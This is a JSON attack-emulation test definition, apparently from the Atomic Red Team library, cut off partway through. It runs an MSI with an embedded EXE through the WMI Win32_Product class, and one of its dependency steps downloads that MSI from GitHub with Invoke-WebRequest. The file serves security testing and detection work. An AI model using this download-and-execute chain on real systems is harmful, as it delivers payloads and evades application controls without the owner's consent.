{
  "id": "55080eb0-49ae-4f55-a440-4167b7974f79",
  "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE",
  "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "13b09827-c47a-4e72-b398-b56da693ede1",
      "type": "execute-command",
      "data": {
        "command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5d443941-dae9-44e1-acd9-c2b6df54862b",
      "name": "Check dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "18da24af-c870-4d8d-9211-eba5eced50d6",
      "name": "Resolve dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "f8cb12b9-60d2-42c1-a667-8200983e8710",
      "name": "Re-check dependency 1/1",
      "description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "5d443941-dae9-44e1-acd9-c2b6df54862b",
